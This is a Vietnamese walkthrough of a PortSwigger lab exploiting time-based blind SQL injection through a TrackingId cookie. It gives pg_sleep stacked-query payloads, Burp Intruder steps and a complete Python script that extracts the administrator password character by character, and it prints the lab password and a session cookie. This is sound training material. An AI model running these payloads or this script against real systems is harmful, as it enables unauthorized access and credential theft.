![Giao diện lab ban đầu](images/Pasted%20image%2020260618125658.png)
# Tổng quan
-Lab có lỗ hổng blind SQLi.App sử dụng tracking cookie để query SQL
-Kết quả của truy vấn SQL không được trả về, và app không phản hồi gì
-Database có chứa một table là `users` với các bảng `username` và `password`
=>Ta cần khai thác Blind SQLi để tìm password của tài khoản `administrator`
# Khai thác
-Vì theo như mô tả thì lab có Tracking cookie để query SQL nên ta có thể suy ra được là lỗ hổng blind SQLi nằm ở parameter TrackingId
-Ta sử dụng payload sau:
```SQL
';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
```
-Giải thích payload:
+ Dấu `'` dùng để đóng câu truy vấn và ta dùng `;` để dùng stack queries(Lý do cho việc này là vì Server không trả về lỗi nên ta không thể dùng `ORDER BY 1,2,3--`.Thêm cả `UNION SELECT` vì đây là câu `SELECT` gọi hàm )
-Ta quay lại với Burp, viết payload + `Ctrl U` để test xem payload có hiệu quả không:
![Payload time-based SQLi trong Burp Repeater](images/Pasted%20image%2020260618203246.png)

Và bùm:
![Response bị delay 10 giây chứng minh payload hoạt động](images/Pasted%20image%2020260618203350.png)
Web bị delay thêm 10s => payload hoạt động.
Tiếp theo ta cần biết password của `administrator` có độ dài bao nhiêu:
```SQL
';SELECT CASE WHEN (username='administrator' AND LENGTH(password)>30) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
--Trả về false(delay 0s)
';SELECT CASE WHEN (username='administrator' AND LENGTH(password)<30) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
--Trả về true(delay 10s)
';SELECT CASE WHEN (username='administrator' AND LENGTH(password)<20) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
--Trả về false(delay 0s)
';SELECT CASE WHEN (username='administrator' AND LENGTH(password)<21) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
--Trả về true(delay 10s)
';SELECT CASE WHEN (username='administrator' AND LENGTH(password)=20) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
--Trả về true(delay 10s)
```
Vậy ta biết được rằng là password có 20 ký tự,tiếp theo ta dùng `Burp Intruder`:
```SQL
';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='$a$') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```
ta thêm list `a-z,A-Z,0-9` rồi bấm start attack:
![Burp Intruder brute-force ký tự password bằng response received](images/Pasted%20image%2020260618210404.png)

Đợi 10s và bấm vào `response received` để nó hiện value lớn nhất => đó chính là ký tự đầu tiên của password chỉ cần thay:
```SQL
';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,2,1)='$a$') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```
ta sẽ tìm được ký tự 2 rồi tiếp đến ký tự 3.

Kiên trì một lúc ta được mật khẩu:`dq4nn3l1d5omzqgw7mld`

Một cách khác thay vì mất thời gian dùng `Burp Intruder` ta có thể viết Script Python:
```Python
import requests
import string
import time
 
# ============================================================
#  CẤU HÌNH — custon phần này
# ============================================================
HOST    = "0abd0050046ded1281777fa800ff00d6.web-security-academy.net"
SESSION = "9s8Knu5lD8jOhXnaNP5mCwb8FYlrRkhL"
 
SLEEP_TIME  = 2      # giây — phải khớp với pg_sleep() trong payload
THRESHOLD   = 1.7    # nếu response time > threshold → ký tự đúng
MAX_LENGTH  = 30     # độ dài tối đa password cần kiểm tra
USERNAME    = "administrator"
 
ASCII_MIN = 32
ASCII_MAX = 126
# ============================================================
 
BASE_URL = f"https://{HOST}/"
 
# Query dùng ASCII() + so sánh > mid thay vì so sánh trực tiếp ký tự
ASCII_PAYLOAD_TEMPLATE = (
    "NWzZc34FKUJvtd97'%3BSELECT+CASE+WHEN+"
    "(username='{user}'+AND+ASCII(SUBSTRING(password,{pos},1))>{mid})"
    "+THEN+pg_sleep({sleep})+ELSE+pg_sleep(0)+END+FROM+users--"
)
 
LENGTH_PAYLOAD_TEMPLATE = (
    "NWzZc34FKUJvtd97'%3BSELECT+CASE+WHEN+"
    "(username='{user}'+AND+LENGTH(password)={length})"
    "+THEN+pg_sleep({sleep})+ELSE+pg_sleep(0)+END+FROM+users--"
)
 
 
def check_delay(tracking_id: str) -> bool:
    """Gửi request và kiểm tra xem có delay không."""
    cookies = {
        "TrackingId": tracking_id,
        "session": SESSION,
    }
    headers = {
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/144.0.0.0 Safari/537.36"
        ),
        "Accept-Language": "en-US,en;q=0.9",
    }
    start = time.time()
    try:
        requests.get(BASE_URL, cookies=cookies, headers=headers, timeout=15)
    except requests.Timeout:
        return True
    elapsed = time.time() - start
    return elapsed > THRESHOLD
 
 
def find_password_length() -> int:
    """Brute-force độ dài password."""
    print("[*] Đang tìm độ dài password...")
    for length in range(1, MAX_LENGTH + 1):
        payload = LENGTH_PAYLOAD_TEMPLATE.format(
            user=USERNAME,
            length=length,
            sleep=SLEEP_TIME,
        )
        if check_delay(payload):
            print(f"[+] Độ dài password: {length}")
            return length
        else:
            print(f"    Thử length={length} → không delay")
    print("[!] Không tìm được độ dài, dùng MAX_LENGTH")
    return MAX_LENGTH
 
 
def binary_search_char(pos: int) -> str:
    """Binary search ASCII code cho 1 ký tự — chỉ ~7 request thay vì 90+."""
    lo, hi = ASCII_MIN, ASCII_MAX
 
    while lo < hi:
        mid = (lo + hi) // 2
        payload = ASCII_PAYLOAD_TEMPLATE.format(
            user=USERNAME,
            pos=pos,
            mid=mid,
            sleep=SLEEP_TIME,
        )
        if check_delay(payload):
            lo = mid + 1   # ASCII > mid → tìm nửa trên
        else:
            hi = mid       # ASCII <= mid → tìm nửa dưới
 
    return chr(lo) if ASCII_MIN <= lo <= ASCII_MAX else "?"
 
 
def brute_force_password(length: int) -> str:
    """Binary search từng ký tự."""
    password = ""
    print(f"\n[*] Bắt đầu binary search {length} ký tự...\n")
 
    for pos in range(1, length + 1):
        char = binary_search_char(pos)
        password += char
        print(f"[+] Vị trí {pos:02d}: '{char}'  →  Password hiện tại: {password}")
 
    return password
 
 
if __name__ == "__main__":
    print("=" * 50)
    print("  Time-Based Blind SQLi — ASCII Binary Search")
    print(f" Tiến hành exploit :v")
    print("=" * 50)
 
    pw_length = find_password_length()
    password  = brute_force_password(pw_length)
 
    print("\n" + "=" * 50)
    print(f"  [✓] Password tìm được: {password}")
    print("=" * 50)
```
-Ta cũng sẽ ra được mật khẩu tương tự.

-Việc còn lại của ta là đăng nhập với tên `administrator` và hoàn thành lab
<img width="1678" height="897" alt="image" src="https://github.com/user-attachments/assets/0a13b003-50ff-454b-acae-815a3ba825f7" />

=> Solved
